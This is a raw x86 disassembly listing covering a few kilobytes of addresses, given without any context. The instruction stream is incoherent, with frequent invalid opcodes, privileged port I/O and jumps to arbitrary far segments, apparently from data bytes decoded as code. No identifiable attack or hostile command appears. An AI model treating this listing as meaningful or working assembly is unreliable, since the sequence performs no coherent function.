  419466:	mov    ds:0xa27fd69b,al
  41946b:	retf   0xb4d7
  41946e:	mov    ch,0x68
  419470:	data16 loopne 0x419442
  419473:	xchg   edi,eax
  419474:	sar    BYTE PTR [edi],cl
  419476:	and    ebp,eax
  419478:	iret   
  419479:	inc    eax
  41947a:	push   edx
  41947b:	cmp    eax,0x4ea034b1
  419480:	rcr    edi,cl
  419482:	xchg   ebx,eax
  419483:	mov    edi,DWORD PTR [ebp-0x5c]
  419486:	jge    0x4194aa
  419488:	nop
  419489:	xor    esp,DWORD PTR [ecx+0x707cee17]
  41948f:	loope  0x4194e2
  419491:	fmul   DWORD PTR [ebx+0x6817169a]
  419497:	jmp    0xb241b3f1
  41949c:	in     al,dx
  41949d:	sub    eax,0x1a4c6434
  4194a2:	repz dec edx
  4194a4:	retf   0x1da5
  4194a7:	pop    eax
  4194a8:	cld    
  4194a9:	ins    DWORD PTR es:[edi],dx
  4194aa:	mov    ebp,0xb0b44a56
  4194af:	and    BYTE PTR [edi-0x924cfec],0xc7
  4194b6:	dec    ebp
  4194b7:	sbb    DWORD PTR [edi],0x4d3ba58f
  4194bd:	jecxz  0x4194f8
  4194bf:	xchg   edx,eax
  4194c0:	clc    
  4194c1:	mov    ch,0x3b
  4194c3:	add    BYTE PTR [ecx-0x2b],ch
  4194c6:	or     BYTE PTR [edx-0x50],ch
  4194c9:	sbb    dl,BYTE PTR [esi-0x65]
  4194cc:	les    esp,FWORD PTR [edx+0x4f1fe0b0]
  4194d2:	add    cl,BYTE PTR ds:0x744a8b06
  4194d8:	test   DWORD PTR [edx+0xb],ebx
  4194db:	xchg   edx,eax
  4194dc:	test   eax,0xd21b5d23
  4194e1:	xor    al,0x82
  4194e3:	(bad)  
  4194e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194e5:	adc    ebx,DWORD PTR [edx-0x8]
  4194e8:	inc    edx
  4194e9:	data16 ins BYTE PTR es:[edi],dx
  4194eb:	not    BYTE PTR [ebp-0x5c]
  4194ee:	das    
  4194ef:	test   DWORD PTR [edi-0x18],esi
  4194f2:	ins    BYTE PTR es:[edi],dx
  4194f3:	pop    ebp
  4194f4:	lea    ebp,[ecx+0x66]
  4194f7:	out    0x44,eax
  4194f9:	mov    gs:0x4174c60c,al
  4194ff:	cmp    DWORD PTR [ebp+0x45],eax
  419502:	xchg   ebx,eax
  419503:	jmp    0x72ba:0x84cbe72d
  41950a:	stos   DWORD PTR es:[edi],eax
  41950b:	aaa    
  41950c:	jp     0x4194cb
  41950e:	dec    eax
  41950f:	jne    0x41952d
  419511:	es or  ecx,edi
  419514:	sbb    DWORD PTR [edi+edx*2],ebp
  419517:	adc    al,BYTE PTR [edx+eax*8]
  41951a:	(bad)  
  41951b:	fst    DWORD PTR [edx+eiz*8-0x622d1b49]
  419523:	mov    edi,0x564ef684
  419528:	cld    
  419529:	push   esp
  41952a:	mov    fs,ebp
  41952c:	dec    esp
  41952d:	scas   eax,DWORD PTR es:[edi]
  41952e:	mov    ecx,0xda4dafc8
  419533:	pop    ecx
  419534:	or     DWORD PTR [edi+0x5724ca62],ebp
  41953a:	xchg   edx,eax
  41953b:	inc    ecx
  41953c:	(bad)  
  41953d:	sti    
  41953e:	out    dx,eax
  41953f:	aam    0xd3
  419541:	in     al,dx
  419542:	mov    DWORD PTR [edi+0x13],eax
  419545:	aam    0x9f
  419547:	test   al,0x74
  419549:	in     eax,0x9d
  41954b:	cmc    
  41954c:	data16 xor al,0xa2
  41954f:	in     eax,0xad
  419551:	push   ss
  419552:	ins    DWORD PTR es:[edi],dx
  419553:	ins    DWORD PTR es:[edi],dx
  419554:	sub    eax,0x2acfdb1a
  419559:	rcr    DWORD PTR [edi+0x7b249fc1],1
  41955f:	nop
  419560:	mov    edx,DWORD PTR [edx]
  419562:	aaa    
  419563:	sub    BYTE PTR [esi+0x5e0b930],cl
  419569:	fnstcw WORD PTR [edi-0x6195157f]
  41956f:	xchg   edx,eax
  419570:	(bad)  
  419571:	and    dl,BYTE PTR [edx-0x6c82bb4e]
  419577:	jle    0x41954a
  419579:	arpl   dx,dx
  41957b:	bts    DWORD PTR [esi+ebx*2-0x43220706],edx
  419583:	mov    edx,0x8fbbf6e4
  419588:	clc    
  419589:	sahf   
  41958a:	aaa    
  41958b:	scas   eax,DWORD PTR es:[edi]
  41958c:	and    cl,BYTE PTR [ebp-0x53]
  41958f:	mov    esp,0x674ee07
  419594:	mov    ds:0xf59ab42a,al
  419599:	jmp    0x419536
  41959b:	mov    ah,0x6c
  41959d:	int3   
  41959e:	clc    
  41959f:	call   0xfa3d:0x9fc25933
  4195a6:	add    al,0xad
  4195a8:	pop    esp
  4195a9:	in     eax,dx
  4195aa:	jns    0x41955a
  4195ac:	bound  esi,QWORD PTR [ebp+0x306d2362]
  4195b2:	and    eax,0xd436189
  4195b7:	xchg   bl,ah
  4195b9:	icebp  
  4195ba:	test   al,0x6b
  4195bc:	add    DWORD PTR [edi-0x47],edx
  4195bf:	sub    al,0x11
  4195c1:	loope  0x4195a2
  4195c3:	(bad)  
  4195c5:	fimul  WORD PTR [edi-0x29]
  4195c8:	aam    0x18
  4195ca:	into   
  4195cb:	fwait
  4195cc:	mov    ss,edi
  4195ce:	fsubr  QWORD PTR [edx]
  4195d0:	add    BYTE PTR [edi-0x3576d2],al
  4195d6:	jmp    0x9f35:0x9e0a9263
  4195dd:	jp     0x4195ea
  4195df:	test   BYTE PTR [edx],dl
  4195e1:	mov    ch,0xb4
  4195e3:	jne    0x4195ec
  4195e5:	push   edi
  4195e6:	or     al,0xd9
  4195e8:	loope  0x41964e
  4195ea:	cld    
  4195eb:	mov    bh,0xb2
  4195ed:	(bad)  
  4195ee:	push   0xffffffe0
  4195f0:	aas    
  4195f1:	xchg   ebx,eax
  4195f2:	sub    al,0x26
  4195f4:	iret   
  4195f5:	or     BYTE PTR [ebx-0x4d],dh
  4195f8:	push   ds
  4195f9:	shr    bl,cl
  4195fb:	xchg   ebp,eax
  4195fc:	frstor [esp+edi*2+0x1977f391]
  419603:	popf   
  419604:	jb     0x41958b
  419606:	mov    ds:0xa6d3806b,eax
  41960b:	pop    esp
  41960c:	sub    ebp,DWORD PTR [eax-0x5774f90f]
  419612:	sar    edx,1
  419614:	dec    edx
  419615:	sbb    eax,0x3b99b22f
  41961a:	mov    esi,0xeb2cc19b
  41961f:	cwde   
  419620:	inc    DWORD PTR [edx]
  419622:	xchg   esp,eax
  419623:	cmc    
  419624:	dec    esi
  419625:	inc    edi
  419626:	imul   esp,esi,0xffffff82
  419629:	mov    ds:0xc0618e11,al
  41962e:	and    ah,BYTE PTR [eax+0x2070c672]
  419634:	mov    ds:0x7e6dcd21,eax
  419639:	stc    
  41963a:	arpl   WORD PTR [ecx+ebx*2-0x31],bp
  41963e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41963f:	or     BYTE PTR [esi-0x71],ch
  419642:	mov    ds:0x1fc6283e,eax
  419647:	cmc    
  419648:	xlat   BYTE PTR ds:[ebx]
  419649:	imul   edi
  41964b:	icebp  
  41964c:	cmp    BYTE PTR [ebx+eiz*1-0x3021b372],ch
  419653:	aaa    
  419654:	push   ss
  419655:	mov    bl,0xce
  419657:	icebp  
  419658:	imul   ebp,DWORD PTR [ebp-0x474372b3],0x20
  41965f:	gs jp  0x4196c6
  419662:	les    esi,FWORD PTR [ecx]
  419664:	xor    dh,al
  419666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419667:	das    
  419668:	and    eax,0x39218cfa
  41966d:	push   0xfffffff0
  41966f:	mov    al,ds:0x399b104d
  419674:	retf   0x6067
  419677:	addr16 dec esi
  419679:	push   esi
  41967a:	repnz push 0x7dc0594e
  419680:	ret    0x5931
  419683:	or     eax,0xffffff8a
  419686:	xchg   edx,eax
  419687:	push   esi
  419688:	mov    ebp,0xe9b17b59
  41968d:	jg     0x4196ad
  41968f:	mov    ds:0x20a8758,eax
  419694:	jb     0x419666
  419696:	dec    DWORD PTR [ebx+0xa9be50b]
  41969c:	fmul   DWORD PTR gs:[ebx]
  41969f:	sbb    eax,edi
  4196a1:	imul   eax,DWORD PTR [eax],0x17
  4196a4:	pushf  
  4196a5:	add    bh,BYTE PTR [edi+0x36]
  4196a8:	inc    DWORD PTR [esi+0x66de1180]
  4196ae:	jnp    0x419684
  4196b0:	and    DWORD PTR ds:0x3a8c1a4f,0xffffff94
  4196b7:	xchg   ebp,eax
  4196b8:	and    BYTE PTR [ebp-0x2c41d434],cl
  4196be:	ror    DWORD PTR [edi-0x7ab2f2b0],cl
  4196c4:	inc    BYTE PTR [ebp-0x52]
  4196c7:	repnz les ecx,FWORD PTR [esp+ebp*2-0x1aed1f08]
  4196cf:	xchg   edi,eax
  4196d0:	dec    ebx
  4196d1:	xor    eax,DWORD PTR [esp+eax*2+0x23]
  4196d5:	popf   
  4196d6:	outs   dx,DWORD PTR ds:[esi]
  4196d7:	jmp    0x419734
  4196d9:	add    al,dh
  4196db:	jecxz  0x41974b
  4196dd:	ret    0x482c
  4196e0:	cmp    DWORD PTR [eax-0x71],esi
  4196e3:	jo     0x419715
  4196e5:	dec    eax
  4196e6:	dec    eax
  4196e7:	mov    ebx,0x50973095
  4196ec:	mov    edi,0xa51f30ef
  4196f1:	push   es
  4196f2:	ins    DWORD PTR es:[edi],dx
  4196f3:	cli    
  4196f4:	popf   
  4196f5:	ret    0xa7be
  4196f8:	outs   dx,BYTE PTR ds:[esi]
  4196f9:	inc    esp
  4196fa:	xchg   ebp,eax
  4196fb:	fnstcw WORD PTR [ecx+edi*1-0x27bd0852]
  419702:	xor    BYTE PTR [eax-0x33],0x46
  419706:	aas    
  419707:	stos   DWORD PTR es:[edi],eax
  419708:	push   ebp
  419709:	lods   al,BYTE PTR ds:[esi]
  41970a:	adc    edi,DWORD PTR [ebx-0x60084974]
  419710:	mov    eax,ds:0x2d9ba163
  419715:	push   ecx
  419716:	push   edi
  419717:	xchg   ebx,eax
  419718:	pop    edi
  419719:	xor    ebp,DWORD PTR [esi+0x1895bc13]
  41971f:	cmp    eax,0xbbfbe12d
  419724:	add    eax,0xecbe11ba
  419729:	aaa    
  41972a:	jge    0x41970b
  41972c:	adc    BYTE PTR [edx+0x183b9a8],ch
  419732:	cs dec eax
  419734:	mov    eax,ds:0xc7c76412
  419739:	sbb    ebp,DWORD PTR [edi]
  41973b:	xor    eax,0xd514e9d
  419740:	or     ebp,DWORD PTR [ebx-0x5e]
  419743:	fldenv [esi]
  419745:	sub    eax,0x2118f17b
  41974a:	out    0x3,al
  41974c:	test   eax,0xf64311ef
  419751:	scas   al,BYTE PTR es:[edi]
  419752:	pop    ds
  419753:	adc    bh,BYTE PTR [esi-0x6d]
  419756:	pop    ss
  419757:	out    dx,al
  419758:	jg     0x41974a
  41975a:	(bad)  
  41975c:	push   cs
  41975d:	adc    al,0x73
  41975f:	adc    bh,al
  419761:	popa   
  419762:	push   ecx
  419763:	out    0xfb,al
  419765:	xchg   ebx,esp
  419767:	inc    esi
  419768:	sub    al,0xbd
  41976a:	outs   dx,DWORD PTR ds:[esi]
  41976b:	mov    WORD PTR [edx-0x10],gs
  41976e:	les    ebp,FWORD PTR [ebp-0x4fdf74ed]
  419774:	lods   al,BYTE PTR ds:[esi]
  419775:	and    DWORD PTR [edi-0x59ab6fc],ebx
  41977b:	sub    BYTE PTR [ecx-0x5dd130c7],bl
  419781:	js     0x419776
  419783:	and    WORD PTR [esi-0x72],cx
  419787:	dec    ebp
  419788:	shl    DWORD PTR [edx+0x7e62be80],cl
  41978e:	mov    ds:0x7ccd1e9,al
  419793:	fdivr  DWORD PTR [edx-0x277680ca]
  419799:	fidiv  DWORD PTR [ebx-0x7d]
  41979c:	or     al,0xfb
  41979e:	inc    eax
  41979f:	sbb    ecx,edx
  4197a1:	ss fdiv st(6),st
  4197a4:	jle    0x419777
  4197a6:	xor    eax,0xf616fefc
  4197ab:	pop    esi
  4197ac:	sbb    al,0x47
  4197ae:	sbb    bl,al
  4197b0:	jp     0x419738
  4197b2:	push   ds
  4197b3:	xchg   ebx,eax
  4197b4:	push   cs
  4197b5:	mov    ebp,0x5cca6f51
  4197ba:	dec    edx
  4197bb:	cmp    DWORD PTR [ebx-0x2db1add1],ecx
  4197c1:	adc    edi,DWORD PTR [ebx+0x6f3ee3a9]
  4197c7:	jo     0x419832
  4197c9:	scas   eax,DWORD PTR es:[edi]
  4197ca:	pop    ds
  4197cb:	rcl    edx,cl
  4197cd:	pop    edx
  4197ce:	in     eax,dx
  4197cf:	jmp    0x14b4:0x787c4fbc
  4197d6:	or     BYTE PTR [esi+eax*1-0x6c],cl
  4197da:	xchg   ebp,eax
  4197db:	xor    BYTE PTR [ecx+0x19],cl
  4197de:	int    0xe3
  4197e0:	adc    BYTE PTR [edx-0x2fca741a],dh
  4197e6:	mov    BYTE PTR [esi+0x62],ch
  4197e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ea:	push   DWORD PTR [edx+0x6b6574de]
  4197f0:	daa    
  4197f1:	pop    ebx
  4197f2:	mov    edx,0x39d83163
  4197f7:	mov    esi,0x3b110448
  4197fc:	mov    ds:0x2a207523,eax
  419801:	out    0x77,al
  419803:	mov    eax,ds:0xb8415b7
  419808:	pop    ss
  419809:	jmp    0x6b97f94d
  41980e:	add    al,0x4
  419810:	push   ecx
  419811:	out    0x1c,al
  419813:	(bad)  
  419814:	popa   
  419815:	xchg   ecx,eax
  419816:	jge    0x4197ef
  419818:	jnp    0x419895
  41981a:	sub    ebp,DWORD PTR [edi-0x22a28d3]
  419820:	mov    eax,0x94110b01
  419825:	test   BYTE PTR [eax-0x72fe6c17],ch
  41982b:	mov    esp,0xb3a76016
  419830:	sub    BYTE PTR [eax],dh
  419832:	jmp    0x2bb6:0x801d975f
  419839:	cmp    DWORD PTR [ebx+0x3b],ecx
  41983c:	inc    eax
  41983d:	rcl    BYTE PTR [ebp+0x7c],cl
  419840:	loop   0x4197fe
  419842:	or     ebx,ebx
  419844:	xchg   DWORD PTR [edx-0x61],edx
  419847:	test   DWORD PTR [esi+0x7a71a848],esp
  41984d:	loopne 0x419867
  41984f:	call   0xd407df4f
  419854:	rcl    DWORD PTR [ebp+0x58],0xf7
  419858:	inc    esi
  419859:	add    bh,BYTE PTR [ecx-0x39db3fef]
  41985f:	shl    eax,0x44
  419862:	imul   esi,DWORD PTR [ebx-0xee95985],0x4d672cfb
  41986c:	push   es
  41986d:	js     0x4197f2
  41986f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419870:	adc    eax,0x237c4109
  419875:	repz push ecx
  419877:	test   eax,0x7d3c1b5
  41987c:	push   ss
  41987d:	and    ah,ah
  41987f:	inc    ebx
  419880:	and    DWORD PTR [ebp-0x630665e8],esi
  419886:	fmul   st,st(5)
  419888:	scas   al,BYTE PTR es:[edi]
  419889:	push   ecx
  41988a:	mov    ebp,0x4751de28
  41988f:	enter  0x7721,0xa3
  419893:	dec    ebp
  419894:	imul   esi,DWORD PTR [ecx-0x73],0x44
  419898:	cld    
  419899:	pop    esi
  41989a:	enter  0xffca,0xd6
  41989e:	adc    al,0xfe
  4198a0:	fmul   QWORD PTR [edx-0x2f2a5a32]
  4198a6:	out    0x7a,eax
  4198a8:	aaa    
  4198a9:	or     eax,0xcdbd7acf
  4198ae:	inc    edx
  4198af:	fld    QWORD PTR [ebp+0x3c52d749]
  4198b5:	jecxz  0x41987a
  4198b7:	rcr    ah,cl
  4198b9:	lahf   
  4198ba:	(bad)  
  4198bb:	jecxz  0x4198a7
  4198bd:	stc    
  4198be:	mov    al,ds:0x26c93a7a
  4198c3:	add    BYTE PTR [edx+ebx*4+0x16205ddd],bh
  4198ca:	inc    esp
  4198cb:	pop    ebx
  4198cc:	push   esi
  4198cd:	jbe    0x4198fe
  4198cf:	lds    esi,FWORD PTR [ecx-0x72e0bbe6]
  4198d5:	jb     0x419933
  4198d7:	jnp    0x419895
  4198d9:	cmc    
  4198da:	imul   ecx,esp,0xffffff8f
  4198dd:	jl     0x419915
  4198df:	jnp    0x41988c
  4198e1:	xchg   esp,eax
  4198e2:	jmp    0xe957:0x5a1829f5
  4198e9:	adc    DWORD PTR [eax+0x4c23bf03],ecx
  4198ef:	cdq    
  4198f0:	clc    
  4198f1:	jle    0x4198c4
  4198f3:	xchg   DWORD PTR [edi-0x68],esi
  4198f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f8:	sbb    bl,ah
  4198fa:	inc    edi
  4198fb:	shr    eax,cl
  4198fd:	cmp    al,0x85
  4198ff:	jnp    0x4198cd
  419901:	test   eax,0x7315724d
  419906:	mov    bl,0x62
  419908:	mov    cl,0x7a
  41990a:	loop   0x4198cb
  41990c:	add    eax,0x8961ac02
  419911:	aad    0x33
  419913:	dec    esi
  419914:	inc    ecx
  419915:	pop    esp
  419916:	mov    DWORD PTR [edi],ebp
  419918:	fldenv [eax+0x56]
  41991b:	in     al,0xc5
  41991d:	xor    al,BYTE PTR [esp+eiz*2+0x6f10c079]
  419924:	xor    DWORD PTR [esi-0x7fe7a9d6],eax
  41992a:	loop   0x419930
  41992c:	js     0x4198c1
  41992e:	aaa    
  41992f:	hlt    
  419930:	add    BYTE PTR [eax-0x2a961e5c],bh
  419936:	lods   eax,DWORD PTR ds:[esi]
  419937:	jo     0x4198e7
  419939:	add    bl,bh
  41993b:	ret    
  41993c:	mov    bl,0x92
  41993e:	xor    eax,0xb748fae5
  419943:	nop
  419944:	push   ebx
  419945:	pop    ebp
  419946:	div    bh
  419948:	push   edx
  419949:	and    al,0x3f
  41994b:	mov    esp,0x47d73c47
  419950:	sub    eax,0xb0025f12
  419955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419956:	jg     0x419988
  419958:	or     edi,DWORD PTR [edi-0x9057815]
  41995e:	or     BYTE PTR [ecx-0x63],dl
  419961:	imul   ebx,DWORD PTR [ebx-0x607848be],0x3
  419968:	sbb    eax,0x313bc943
  41996d:	lods   al,BYTE PTR gs:[esi]
  41996f:	ret    0x2aea
  419972:	loop   0x419924
  419974:	(bad)  
  419975:	jge    0x419968
  419977:	sub    esp,edx
  419979:	sbb    esi,DWORD PTR [ecx]
  41997b:	sub    DWORD PTR [edi-0x7c2808be],ebp
  419981:	dec    edx
  419982:	ja     0x4199f4
  419984:	pop    edx
  419985:	jl     0x419933
  419987:	ins    BYTE PTR es:[edi],dx
  419988:	xchg   ebp,eax
  419989:	or     al,BYTE PTR [ebx+0x6473217a]
  41998f:	sbb    ch,BYTE PTR [ecx]
  419991:	pop    ebp
  419992:	in     al,0x37
  419994:	inc    ebx
  419995:	xor    DWORD PTR [ebx-0xbd58c66],eax
  41999b:	fld    DWORD PTR ds:[eax+0x7857715e]
  4199a2:	out    0x15,al
  4199a4:	popa   
  4199a5:	adc    edx,edi
  4199a7:	cmp    BYTE PTR [ebx],bl
  4199a9:	aam    0x50
  4199ab:	test   al,0x6d
  4199ad:	vmread DWORD PTR [esi],ebx
  4199b0:	test   eax,0x7aa5a7b7
  4199b5:	xor    eax,0x5760a4b6
  4199ba:	inc    ecx
  4199bb:	lock xchg DWORD PTR fs:[eax],ebx
  4199bf:	iret   
  4199c0:	add    edx,edi
  4199c2:	mov    ch,cl
  4199c4:	repz aaa 
  4199c6:	or     al,0x29
  4199c8:	pusha  
  4199c9:	adc    eax,0xbe131edb
  4199ce:	xchg   ecx,eax
  4199d0:	mov    ebp,0x153e4afc
  4199d5:	jp     0x419a27
  4199d7:	aad    0x30
  4199d9:	iret   
  4199da:	inc    ecx
  4199db:	ror    DWORD PTR [ebp+eax*4+0x11],0xc
  4199e0:	xchg   ecx,eax
  4199e1:	pop    edx
  4199e2:	ins    BYTE PTR es:[edi],dx
  4199e3:	pushf  
  4199e4:	pop    ebp
  4199e5:	outs   dx,BYTE PTR ds:[esi]
  4199e6:	fdivr  QWORD PTR [edx+0x781150cb]
  4199ec:	and    DWORD PTR [ecx+0x1d],edx
  4199ef:	imul   esi,DWORD PTR [esi+ebx*4-0x7],0x65
  4199f4:	mov    al,0xfd
  4199f6:	fucompp 
  4199f8:	lea    ebx,[ebp+0x23]
  4199fb:	xchg   ecx,eax
  4199fc:	pushf  
  4199fd:	(bad)  
  4199fe:	and    eax,0xd976244
  419a03:	ins    DWORD PTR es:[edi],dx
  419a04:	xlat   BYTE PTR ds:[ebx]
  419a05:	add    BYTE PTR [ecx-0x48],bh
  419a08:	es pop ecx
  419a0a:	out    0x20,eax
  419a0c:	add    BYTE PTR [eax],0x8e
  419a0f:	jae    0x419a41
  419a11:	dec    edx
  419a12:	call   0x6111:0x1556fc25
  419a19:	add    eax,0x3d8cc5c3
  419a1e:	mov    dh,0xb2
  419a20:	or     eax,0xdb87e0e3
  419a25:	and    eax,0x369f9932
  419a2a:	fnstcw WORD PTR [esi-0x6c7dee10]
  419a30:	fadd   st(3),st
  419a32:	clc    
  419a33:	push   esi
  419a34:	in     al,0x23
  419a36:	mov    al,ds:0x2d92fdd4
  419a3b:	in     eax,0x43
  419a3d:	mov    esp,0xec6d05da
  419a42:	push   esi
  419a43:	add    ebp,DWORD PTR [edi]
  419a45:	shl    BYTE PTR [ebx+0x49],cl
  419a48:	ins    DWORD PTR es:[edi],dx
  419a49:	fstp   DWORD PTR [edi+0x7da64703]
  419a4f:	add    BYTE PTR [eax+0x5f],bl
  419a52:	icebp  
  419a53:	pop    esp
  419a54:	retf   
  419a55:	adc    ebx,DWORD PTR [edx+0x21cfd0f]
  419a5b:	data16 daa 
  419a5d:	js     0x4199e7
  419a5f:	popa   
  419a60:	sti    
  419a61:	adc    DWORD PTR [ebx],edi
  419a63:	mov    BYTE PTR ds:0x8ef17151,0xe5
  419a6a:	mov    bp,0x6772
  419a6e:	inc    esp
  419a6f:	mov    WORD PTR ds:[ebp+0x76],es
  419a73:	jl     0x419a80
  419a75:	sub    BYTE PTR [edi],0x11
  419a78:	out    0xfe,al
  419a7a:	xor    eax,DWORD PTR [ebx+0x7aabf12a]
  419a80:	mov    bl,0x8
  419a82:	push   esi
  419a83:	mov    eax,ds:0xad730122
  419a88:	dec    esp
  419a89:	jns    0x419a78
  419a8b:	clc    
  419a8c:	mov    cl,0xa7
  419a8e:	jp     0x419a43
  419a90:	mov    dh,0x8b
  419a92:	popa   
  419a93:	je     0x419abd
  419a95:	push   cs
  419a96:	loop   0x419ac8
  419a98:	jno    0x419b07
  419a9a:	lods   al,BYTE PTR ds:[esi]
  419a9b:	sbb    al,0xae
  419a9d:	mov    bl,0xa9
  419a9f:	or     DWORD PTR ds:0x2f60a4b7,ecx
  419aa5:	dec    esp
  419aa7:	test   BYTE PTR [eax+edx*1+0x764fe677],0x59
  419aaf:	daa    
  419ab0:	ret    0x46d
  419ab3:	push   0x3c55cc6e
  419ab8:	jmp    0x419a97
  419aba:	call   0xa2b9:0x287ddf57
  419ac1:	in     eax,dx
  419ac2:	cmp    ch,BYTE PTR [ecx+0xe]
  419ac5:	mov    BYTE PTR [esi],dl
  419ac7:	jl     0x419a52
  419ac9:	sbb    eax,0x3728cf52
  419ace:	int    0xb9
  419ad0:	lea    esi,[edi+0x7c]
  419ad3:	mov    bh,0x51
  419ad5:	fisubr WORD PTR [edi+0x36a1193f]
  419adb:	jecxz  0x419a6f
  419add:	jae    0x419ac8
  419adf:	dec    ebx
  419ae0:	loop   0x419aa8
  419ae2:	test   edx,edi
  419ae4:	mov    al,0x7f
  419ae6:	or     esp,DWORD PTR [esi+0x5e2e786d]
  419aec:	shl    BYTE PTR [ebp-0x2b],cl
  419aef:	pusha  
  419af0:	push   eax
  419af1:	adc    BYTE PTR [ebx+edi*2],cl
  419af4:	ret    
  419af5:	stos   DWORD PTR es:[edi],eax
  419af6:	cmp    BYTE PTR [ebx],ch
  419af8:	bound  edi,QWORD PTR ds:0x6f9da6de
  419afe:	fadd   QWORD PTR [ecx]
  419b00:	lock mov eax,ds:0xc5021479
  419b06:	loope  0x419b32
  419b08:	add    al,0xd6
  419b0a:	fnclex 
  419b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b0d:	inc    esi
  419b0e:	call   0x4861:0x91bff97a
  419b15:	pop    ss
  419b16:	gs cwde 
  419b18:	fisttp DWORD PTR [ebp-0x4b13ac85]
  419b1e:	jne    0x419b82
  419b20:	mov    esp,0x5fce8602
  419b25:	jmp    0xf96a5c52
  419b2a:	inc    ecx
  419b2b:	sub    bh,dh
  419b2d:	stc    
  419b2e:	fwait
  419b2f:	xchg   BYTE PTR [eax],dh
  419b31:	into   
  419b32:	daa    
  419b33:	pop    ds
  419b34:	test   BYTE PTR [esi],bh
  419b36:	and    cl,BYTE PTR [ecx-0x76793b01]
  419b3c:	xchg   edi,eax
  419b3d:	sub    edx,ebp
  419b3f:	push   eax
  419b40:	bound  ebx,QWORD PTR [edi+0x17a9f2a5]
  419b46:	lods   eax,DWORD PTR ds:[esi]
  419b47:	call   0xf43ce801
  419b4c:	dec    edi
  419b4d:	cmp    eax,DWORD PTR [esi-0x570268ce]
  419b53:	mov    ebp,0xb5a7d098
  419b58:	sub    dl,BYTE PTR [ecx-0x405e64c4]
  419b5e:	or     al,0xb2
  419b60:	inc    esp
  419b61:	sub    DWORD PTR [edi],ebx
  419b63:	test   al,0xae
  419b65:	add    DWORD PTR [eax+0x34285603],edi
  419b6b:	sub    eax,0xe46202e6
  419b70:	xchg   esi,eax
  419b71:	pusha  
  419b72:	or     BYTE PTR [ecx-0x52],ah
  419b75:	cmp    DWORD PTR [ecx-0x75],ecx
  419b78:	imul   ebp,DWORD PTR [edx+0x29],0xffffff8a
  419b7c:	daa    
  419b7d:	inc    ebp
  419b7e:	mov    ebp,0xf6266eec
  419b83:	sbb    eax,0x90b3c71a
  419b88:	in     al,0xe9
  419b8a:	mov    ds:0xd2347e02,eax
  419b8f:	push   edx
  419b90:	retf   0xc4b9
  419b93:	add    bh,BYTE PTR [ecx-0x76]
  419b96:	mov    ah,0xc9
  419b98:	aaa    
  419b99:	icebp  
  419b9a:	not    cl
  419b9c:	and    DWORD PTR [ebx],esi
  419b9e:	pop    ebp
  419b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba0:	bound  ecx,QWORD PTR [eax]
  419ba2:	add    al,0x15
  419ba4:	or     al,0x99
  419ba6:	mov    esi,0xdfb81fe0
  419bab:	push   es
  419bac:	mov    bh,0xb0
  419bae:	mov    ah,0xf8
  419bb0:	int    0x44
  419bb2:	dec    ecx
  419bb3:	in     eax,0xab
  419bb5:	sub    eax,0x869154e7
  419bba:	sub    BYTE PTR [eax-0x6f],bl
  419bbd:	push   eax
  419bbe:	push   edx
  419bbf:	jbe    0x419bb7
  419bc1:	sar    BYTE PTR [edx],cl
  419bc3:	mov    ch,0xc9
  419bc5:	call   0x9882:0xc780beb6
  419bcc:	lods   eax,DWORD PTR ds:[esi]
  419bcd:	test   DWORD PTR [eax+0x4693d6ed],0x3e8b0f0a
  419bd7:	enter  0x363f,0x39
  419bdb:	retf   
  419bdc:	(bad)  
  419bdd:	push   0xffffff88
  419bdf:	pop    ds
  419be0:	or     ebp,esp
  419be2:	fs fsubr st(0),st
  419be5:	ret    0xe6da
  419be8:	dec    esi
  419be9:	gs in  eax,0x70
  419bec:	test   al,0xe9
  419bee:	das    
  419bef:	xchg   esi,eax
  419bf0:	clc    
  419bf1:	enter  0x1f8,0x29
  419bf5:	mov    dh,0x49
  419bf7:	mov    al,0xfd
  419bf9:	or     eax,0xb994eb5b
  419bfe:	mov    bh,0x1d
  419c00:	repz and eax,ecx
  419c03:	test   al,0x7d
  419c05:	sub    eax,0x6a8c082d
  419c0a:	dec    eax
  419c0b:	sbb    DWORD PTR ds:0xa01c7c98,edi
  419c11:	pop    ebp
  419c12:	xor    ebx,DWORD PTR [edx-0x392b3e94]
  419c18:	mov    dl,0xc
  419c1a:	(bad)  
  419c1b:	push   0x757da336
  419c20:	pop    ebp
  419c21:	in     eax,dx
  419c22:	fstp   TBYTE PTR ss:[eax-0x16]
  419c26:	mov    DWORD PTR [ebx-0x21741817],edi
  419c2c:	iret   
  419c2d:	pop    es
  419c2e:	mov    bh,0xd3
  419c30:	dec    ebp
  419c31:	mov    dl,0xd9
  419c33:	pop    es
  419c34:	mov    cl,BYTE PTR [ecx]
  419c36:	dec    ecx
  419c37:	jb     0x419c49
  419c39:	int3   
  419c3a:	adc    al,BYTE PTR [ebp-0x5d]
  419c3d:	add    BYTE PTR [edx+0x63],cl
  419c40:	dec    ecx
  419c41:	xchg   BYTE PTR [edi-0x78],ch
  419c44:	adc    eax,0x684ac24
  419c49:	jno    0x419c98
  419c4b:	jmp    0x419c64
  419c4d:	loop   0x419c2a
  419c4f:	pop    esp
  419c50:	fsubr  st,st(0)
  419c52:	pop    ecx
  419c53:	std    
  419c54:	int    0xd9
  419c56:	call   0xa35c9572
  419c5b:	arpl   WORD PTR [esi-0x1d],sp
  419c5e:	mov    dh,0x10
  419c60:	pop    esp
  419c61:	mov    ecx,0xa87cef8e
  419c66:	pop    ss
  419c67:	sbb    BYTE PTR [edx],dl
  419c69:	dec    edx
  419c6a:	mov    dl,0x56
  419c6c:	in     al,dx
  419c6d:	clc    
  419c6e:	dec    esp
  419c6f:	push   esp
  419c70:	or     al,0xc2
  419c72:	dec    BYTE PTR [eax-0x192a7066]
  419c78:	xor    al,0x8c
  419c7a:	dec    eax
  419c7b:	out    0xed,eax
  419c7d:	pushf  
  419c7e:	mov    ebp,0xb33db1ad
  419c83:	fidiv  WORD PTR [eax-0x4aeef598]
